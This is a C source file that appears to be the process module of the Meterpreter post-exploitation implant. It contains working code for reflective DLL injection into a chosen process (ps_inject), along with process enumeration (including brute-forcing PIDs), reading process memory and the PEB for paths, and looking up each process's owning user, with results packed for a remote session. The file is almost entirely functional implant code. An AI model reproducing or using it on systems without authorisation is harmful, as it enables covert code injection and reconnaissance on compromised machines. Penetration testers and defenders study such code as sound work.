#include "precomp.h"
#include "common_metapi.h"
#include "ps.h"
#include <wchar.h>

#include "./../session.h"

/*
 * Get the arch type (either x86 or x64) for a given PE (either PE32 or PE64) DLL image.
 */
DWORD ps_getarch_dll( LPVOID lpDllBuffer )
{
	DWORD dwDllArch             = PROCESS_ARCH_UNKNOWN;
	PIMAGE_NT_HEADERS pNtHeader = NULL;

	do
	{
		if( !lpDllBuffer )
			break;

		// get the File Offset of the modules NT Header
		pNtHeader = (PIMAGE_NT_HEADERS)( ((UINT_PTR)lpDllBuffer) + ((PIMAGE_DOS_HEADER)lpDllBuffer)->e_lfanew );

		if( pNtHeader->OptionalHeader.Magic == 0x010B ) // PE32
			dwDllArch = PROCESS_ARCH_X86;
		else if( pNtHeader->OptionalHeader.Magic == 0x020B ) // PE64
			dwDllArch = PROCESS_ARCH_X64;

	} while( 0 );

	return dwDllArch;
}

/*
 * Inject a DLL into another process via Reflective DLL Injection.
 */
DWORD ps_inject( DWORD dwPid, DLL_BUFFER * pDllBuffer, LPCSTR reflectiveLoader, char * cpCommandLine )
{
	DWORD dwResult     = ERROR_ACCESS_DENIED;
	DWORD dwPidArch    = PROCESS_ARCH_UNKNOWN;
	DWORD dwDllArch    = PROCESS_ARCH_UNKNOWN;
	LPVOID lpDllBuffer = NULL;
	DWORD dwDllLength  = 0;

	do
	{
		if( !pDllBuffer )
			BREAK_WITH_ERROR( "[PS] ps_inject_dll. No Dll buffer specified", ERROR_INVALID_PARAMETER );

		dwPidArch = ps_getarch( dwPid );

		if( dwPidArch == PROCESS_ARCH_X86 )
		{
			lpDllBuffer = pDllBuffer->lpPE32DllBuffer;
			dwDllLength = pDllBuffer->dwPE32DllLength;
		}
		else if( dwPidArch == PROCESS_ARCH_X64 )
		{
			lpDllBuffer = pDllBuffer->lpPE64DllBuffer;
			dwDllLength = pDllBuffer->dwPE64DllLength;
		}
		else
		{
			BREAK_WITH_ERROR( "[PS] ps_inject_dll. Unable to determine target pid arhitecture", ERROR_INVALID_DATA );
		}

		dwDllArch = ps_getarch_dll( lpDllBuffer );
		if( dwDllArch == PROCESS_ARCH_UNKNOWN )
			BREAK_WITH_ERROR( "[PS] ps_inject_dll. Unable to determine DLL arhitecture", ERROR_BAD_FORMAT );

		if( dwDllArch != dwPidArch )
			BREAK_WITH_ERROR( "[PS] ps_inject_dll. pid/dll architecture mixup", ERROR_BAD_ENVIRONMENT );

		// TODO: support offset for obfuscated dlls
		dwResult = met_api->inject.dll( dwPid, dwPidArch, lpDllBuffer, dwDllLength, reflectiveLoader, 0, cpCommandLine, strlen(cpCommandLine) + 1 );
	} while( 0 );

	return dwResult;
}

/*
 * Get the architecture of the given process.
 */
DWORD ps_getarch( DWORD dwPid )
{
	DWORD result                   = PROCESS_ARCH_UNKNOWN;
	static DWORD dwNativeArch      = PROCESS_ARCH_UNKNOWN;
	HANDLE hProcess                = NULL;
	BOOL bIsWow64                  = FALSE;

	do
	{
		// grab the native systems architecture the first time we use this function...
		if( dwNativeArch == PROCESS_ARCH_UNKNOWN )
			dwNativeArch = ps_getnativearch();

		// first we default to 'x86' as if kernel32!IsWow64Process is not present then we are on an older x86 system.
		result = PROCESS_ARCH_X86;

		// now we must default to an unknown architecture as the process may be either x86/x64 and we may not have the rights to open it
		result = PROCESS_ARCH_UNKNOWN;

		hProcess = met_api->win_api.kernel32.OpenProcess( PROCESS_QUERY_INFORMATION, FALSE, dwPid );
		if( !hProcess )
		{
			hProcess = met_api->win_api.kernel32.OpenProcess( PROCESS_QUERY_LIMITED_INFORMATION, FALSE, dwPid );
			if( !hProcess )
				break;
		}

		met_api->win_api.kernel32.SetLastError(ERROR_PROC_NOT_FOUND);
		if( !met_api->win_api.kernel32.IsWow64Process( hProcess, &bIsWow64 ) )
		{
			// IsWow64Process is absent on older x86-only systems.
			if( met_api->win_api.kernel32.GetLastError() == ERROR_PROC_NOT_FOUND )
				result = PROCESS_ARCH_X86;
			break;
		}

		if( bIsWow64 )
			result = PROCESS_ARCH_X86;
		else
			result = dwNativeArch;

	} while( 0 );

	if( hProcess )
		met_api->win_api.kernel32.CloseHandle( hProcess );

	return result;
}

/*
 * Get the native architecture of the system we are running on.
 */
DWORD ps_getnativearch( VOID )
{
	DWORD dwNativeArch                       = PROCESS_ARCH_UNKNOWN;
	SYSTEM_INFO SystemInfo                   = {0};

	do
	{
		// default to 'x86' as if kernel32!GetNativeSystemInfo is not present then we are on an old x86 system.
		dwNativeArch = PROCESS_ARCH_X86;

		met_api->win_api.kernel32.GetNativeSystemInfo( &SystemInfo );
		switch( SystemInfo.wProcessorArchitecture )
		{
			case PROCESSOR_ARCHITECTURE_AMD64:
				dwNativeArch = PROCESS_ARCH_X64;
				break;
			case PROCESSOR_ARCHITECTURE_IA64:
				dwNativeArch = PROCESS_ARCH_IA64;
				break;
			case PROCESSOR_ARCHITECTURE_INTEL:
				dwNativeArch = PROCESS_ARCH_X86;
				break;
			default:
				dwNativeArch = PROCESS_ARCH_UNKNOWN;
				break;
		}

	} while( 0 );

	return dwNativeArch;
}

/*
 * Attempt to get the processes path and name.
 * First, try psapi!GetModuleFileNameExW (Windows 2000/XP/2003/Vista/2008/7 but cant get x64 process paths from a wow64 process)
 * Secondly, try kernel32!QueryFullProcessImageNameW (Windows Vista/2008/7)
 * Thirdly, try psapi!GetProcessImageFileNameW (Windows XP/2003/Vista/2008/7 - returns native path)
 * If that fails then try to read the path via the process's PEB. (Windows NT4 and above).
 * Note: wcpExeName is optional and only retrieved by parsing the PEB as the toolhelp/psapi techniques can get the name easier.
 */
BOOL ps_getpath(DWORD pid, wchar_t * wcpExePath, DWORD dwExePathSize, wchar_t * wcpExeName, DWORD dwExeNameSize)
{
	BOOL success    = FALSE;
	HANDLE hProcess = NULL;

	do
	{
		if( !wcpExePath || !dwExePathSize )
			break;

		wmemset( wcpExePath, 0, dwExePathSize );

		hProcess = met_api->win_api.kernel32.OpenProcess( PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid );
		if( !hProcess )
			break;

		// first, try psapi!GetModuleFileNameExW (Windows 2000/XP/2003/Vista/2008/7 but cant get x64 process paths from a wow64 process)
		if( met_api->win_api.psapi.GetModuleFileNameExW(hProcess, NULL, wcpExePath, dwExePathSize) )
		{
			success = TRUE;
		}

		// secondly, try kernel32!QueryFullProcessImageNameW (Windows Vista/2008/7)
		if( !success )
		{
			DWORD dwSize   = dwExePathSize;
			if( met_api->win_api.kernel32.QueryFullProcessImageNameW(hProcess, 0, wcpExePath, &dwSize) )
			{
				success = TRUE;
			}
		}

		// thirdly, try psapi!GetProcessImageFileNameW (Windows XP/2003/Vista/2008/7 - returns a native path not a win32 path)
		if( !success )
		{
			if( met_api->win_api.psapi.GetProcessImageFileNameW(hProcess, (LPWSTR)wcpExePath, dwExePathSize) )
			{
				success = TRUE;
			}
		}

		// finally if all else has failed, manually pull the exe path/name out of th PEB...
		if( !success )
		{
			DWORD dwSize                                         = 0;
			PROCESS_BASIC_INFORMATION BasicInformation           = {0};
			RTL_USER_PROCESS_PARAMETERS params                   = {0};
			_PEB peb                                             = {0};

			if( met_api->win_api.ntdll.ZwQueryInformationProcess( hProcess, 0, &BasicInformation, sizeof(PROCESS_BASIC_INFORMATION), &dwSize ) != ERROR_SUCCESS )
				break;

			if( !BasicInformation.PebBaseAddress )
				break;

			if( !met_api->win_api.kernel32.ReadProcessMemory( hProcess, BasicInformation.PebBaseAddress, &peb, 64, NULL ) ) // (just read in the first 64 bytes of PEB)
				break;

			if( !peb.lpProcessParameters )
				break;

			if( !met_api->win_api.kernel32.ReadProcessMemory( hProcess, peb.lpProcessParameters, &params, sizeof(params), NULL ) )
				break;

			if (wcpExePath)
			{
				if( met_api->win_api.kernel32.ReadProcessMemory( hProcess, params.ImagePathName.Buffer, wcpExePath, params.ImagePathName.Length, NULL ) )
				{
					wchar_t * name = NULL;


					if( wcpExeName )
					{
						name = wcsrchr(wcpExePath, L'\\');
						if( name )
							wcsncpy(wcpExeName, name + 1, dwExeNameSize - 1);
					}
					success = TRUE;
				}
			}
		}

	} while( 0 );

	if( hProcess )
		met_api->win_api.kernel32.CloseHandle( hProcess );

	if( !success && wcpExePath )
		wmemset( wcpExePath, 0, dwExePathSize );

	return success;
}


/*
 * Attempt to get the username associated with the given pid.
 */
BOOL ps_getusername( DWORD pid, wchar_t * wcpUserName, DWORD dwUserNameSize )
{
	BOOL success                = FALSE;
	HANDLE hProcess             = NULL;
	HANDLE hToken               = NULL;
	TOKEN_USER * pUser          = NULL;
	SID_NAME_USE peUse          = 0;
	DWORD dwUserLength          = 0;
	DWORD dwDomainLength        = 0;
	DWORD dwLength              = 0;
	wchar_t wcUser[512]         = {0};
	wchar_t wcDomain[512]       = {0};

	do
	{
		if( !wcpUserName || !dwUserNameSize )
			break;

		wmemset( wcpUserName, 0, dwUserNameSize );

		hProcess = met_api->win_api.kernel32.OpenProcess( PROCESS_QUERY_INFORMATION, FALSE, pid );
		if( !hProcess )
			break;

		if( !met_api->win_api.advapi32.OpenProcessToken( hProcess, TOKEN_QUERY, &hToken ) )
			break;

		met_api->win_api.advapi32.GetTokenInformation( hToken, TokenUser, NULL, 0, &dwLength );

		pUser = (TOKEN_USER *)malloc( dwLength );
		if( !pUser )
			break;

		if( !met_api->win_api.advapi32.GetTokenInformation( hToken, TokenUser, pUser, dwLength, &dwLength ) )
			break;

		dwUserLength   = sizeof( wcUser );
		dwDomainLength = sizeof( wcDomain );

		if( !met_api->win_api.advapi32.LookupAccountSidW( NULL, pUser->User.Sid, wcUser, &dwUserLength, wcDomain, &dwDomainLength, &peUse ) )
			break;

		_snwprintf(wcpUserName, dwUserNameSize - 1, L"%s\\%s", wcDomain, wcUser);

		success = TRUE;

	} while(0);

	if( pUser )
		free( pUser );

	if( hToken )
		met_api->win_api.kernel32.CloseHandle( hToken );

	if( hProcess )
		met_api->win_api.kernel32.CloseHandle( hProcess );

	return success;
}



/*
 * Generate a process list via the kernel32!CreateToolhelp32Snapshot method. Works on Windows 2000 and above.
 */
DWORD ps_list_via_toolhelp( Packet * response )
{
	DWORD result                                       = ERROR_INVALID_HANDLE;
	HANDLE hProcessSnap                                = NULL;
	PROCESSENTRY32W pe32                               = {0};

	do
	{
		hProcessSnap = met_api->win_api.kernel32.CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
		if( hProcessSnap == INVALID_HANDLE_VALUE )
			break;

		pe32.dwSize = sizeof( PROCESSENTRY32W );

		if( !met_api->win_api.kernel32.Process32FirstW( hProcessSnap, &pe32 ) )
			break;

		result = ERROR_SUCCESS;

		do
		{
			DWORD dwProcessArch  = PROCESS_ARCH_UNKNOWN;
			wchar_t wcExePath[1024]  = {0};
			wchar_t wcUserName[1024] = {0};
			Tlv entries[5]       = {0};

			ps_getpath( pe32.th32ProcessID, (wchar_t *)&wcExePath, 1024, NULL, 0 );

			ps_getusername( pe32.th32ProcessID, (wchar_t *)&wcUserName, 1024 );

			dwProcessArch = ps_getarch( pe32.th32ProcessID );

			ps_addresult(response, pe32.th32ProcessID, pe32.th32ParentProcessID, pe32.szExeFile, wcExePath, wcUserName, dwProcessArch);

		} while( met_api->win_api.kernel32.Process32NextW( hProcessSnap, &pe32 ) );

	} while(0);

	if( hProcessSnap )
		met_api->win_api.kernel32.CloseHandle( hProcessSnap );

	return result;
}


/*
 * Generate a process list via the psapi!EnumProcesses method.
 * Works on Windows 2000 and above and NT4 if the PSAPI patch has been applied.
 * Note: This method cant determine the parent process id (default to 0).
 */
DWORD ps_list_via_psapi( Packet * response )
{
	DWORD result                           = ERROR_INVALID_HANDLE;
	DWORD dwProcessIds[1024]               = {0};
	DWORD dwBytesReturned                  = 0;
	DWORD index                            = 0;

	do
	{
		if( !met_api->win_api.psapi.EnumProcesses( (DWORD *)&dwProcessIds, sizeof(dwProcessIds), &dwBytesReturned ) )
			break;

		result = ERROR_SUCCESS;

		for( index=0 ; index<(dwBytesReturned/sizeof(DWORD)); index++ )
		{
			HANDLE hProcess      = NULL;
			HMODULE hModule      = NULL;
			DWORD dwProcessArch  = PROCESS_ARCH_UNKNOWN;
			wchar_t wcExeName[1024]  = {0};
			wchar_t wcExePath[1024]  = {0};
			wchar_t wcUserName[1024] = {0};
			Tlv entries[5]       = {0};
			DWORD dwNeeded       = 0;

			do
			{
				hProcess = met_api->win_api.kernel32.OpenProcess( PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwProcessIds[index] );
				if( !hProcess )
					break;

				if( !met_api->win_api.psapi.EnumProcessModules( hProcess, &hModule, sizeof(hModule), &dwNeeded ) )
					break;

				met_api->win_api.psapi.GetModuleBaseNameW(hProcess, hModule, (LPWSTR)wcExeName, 1024);

			} while(0);

			if( hProcess )
				met_api->win_api.kernel32.CloseHandle( hProcess );

			ps_getpath( dwProcessIds[index], (wchar_t *)&wcExePath, 1024, NULL, 0 );

			ps_getusername( dwProcessIds[index], (wchar_t *)&wcUserName, 1024 );

			dwProcessArch = ps_getarch( dwProcessIds[index] );

			ps_addresult(response, dwProcessIds[index], 0, wcExePath, wcExePath, wcUserName, dwProcessArch);
		}

	} while(0);

	return result;
}

/*
 * Generate a process list by brute forcing the process id's. If we can open the
 * process with PROCESS_QUERY_INFORMATION access we can assume the pid exists.
 */
DWORD ps_list_via_brute( Packet * response )
{
	DWORD result = ERROR_SUCCESS;
	DWORD pid    = 0;

	for( pid=0 ; pid<0xFFFF ; pid++ )
	{
		HANDLE hProcess      = NULL;
		DWORD dwProcessArch  = PROCESS_ARCH_UNKNOWN;
		wchar_t wcExeName[1024]  = {0};
		wchar_t wcExePath[1024]  = {0};
		wchar_t wcUserName[1024] = {0};
		Tlv entries[5]       = {0};

		hProcess = met_api->win_api.kernel32.OpenProcess( PROCESS_QUERY_INFORMATION, FALSE, pid );
		if( !hProcess )
			continue;

		met_api->win_api.kernel32.CloseHandle( hProcess );

		ps_getpath( pid, (wchar_t *)&wcExePath, 1024, (wchar_t *)&wcExeName, 1024 );

		ps_getusername( pid, (wchar_t *)&wcUserName, 1024 );

		dwProcessArch = ps_getarch( pid );

		ps_addresult(response, pid, 0, wcExeName, wcExePath, wcUserName, dwProcessArch);
	}

	return result;
}

/*
 * Add the details of a process to the response.
 */
VOID ps_addresult(Packet * response, DWORD dwPid, DWORD dwParentPid, wchar_t * wcpExeName, wchar_t * wcpExePath, wchar_t * wcpUserName, DWORD dwProcessArch)
{
	Tlv entries[7]    = {0};
	DWORD dwSessionId = 0;

	do
	{
		if( !response )
			break;

		dwSessionId = session_id( dwPid );

		dwPid                    = met_api->win_api.ws2_32.htonl( dwPid );
		entries[0].header.type   = TLV_TYPE_PID;
		entries[0].header.length = sizeof( DWORD );
		entries[0].buffer        = (PUCHAR)&dwPid;

		if( !wcpExeName )
			wcpExeName = L"";
		entries[1].header.type   = TLV_TYPE_PROCESS_NAME;
		entries[1].header.length = (DWORD)strlen(met_api->string.wchar_to_utf8(wcpExeName)) + 1;
		entries[1].buffer		 = met_api->string.wchar_to_utf8(wcpExeName);

		if( !wcpExePath )
			wcpExePath = L"";
		entries[2].header.type   = TLV_TYPE_PROCESS_PATH;
		entries[2].header.length = (DWORD)strlen(met_api->string.wchar_to_utf8(wcpExePath)) + 1;
		entries[2].buffer		 = met_api->string.wchar_to_utf8(wcpExePath);

		if( !wcpUserName )
			wcpUserName = L"";
		entries[3].header.type   = TLV_TYPE_USER_NAME;
		entries[3].header.length = (DWORD)strlen(met_api->string.wchar_to_utf8(wcpUserName)) + 1;
		entries[3].buffer		 = met_api->string.wchar_to_utf8(wcpUserName);

		dwProcessArch            = met_api->win_api.ws2_32.htonl( dwProcessArch );
		entries[4].header.type   = TLV_TYPE_PROCESS_ARCH;
		entries[4].header.length = sizeof( DWORD );
		entries[4].buffer        = (PUCHAR)&dwProcessArch;

		dwParentPid              = met_api->win_api.ws2_32.htonl( dwParentPid );
		entries[5].header.type   = TLV_TYPE_PARENT_PID;
		entries[5].header.length = sizeof( DWORD );
		entries[5].buffer        = (PUCHAR)&dwParentPid;

		dwSessionId              = met_api->win_api.ws2_32.htonl( dwSessionId );
		entries[6].header.type   = TLV_TYPE_PROCESS_SESSION;
		entries[6].header.length = sizeof( DWORD );
		entries[6].buffer        = (PUCHAR)&dwSessionId;

		met_api->packet.add_tlv_group( response, TLV_TYPE_PROCESS_GROUP, entries, 7 );

	} while(0);
}
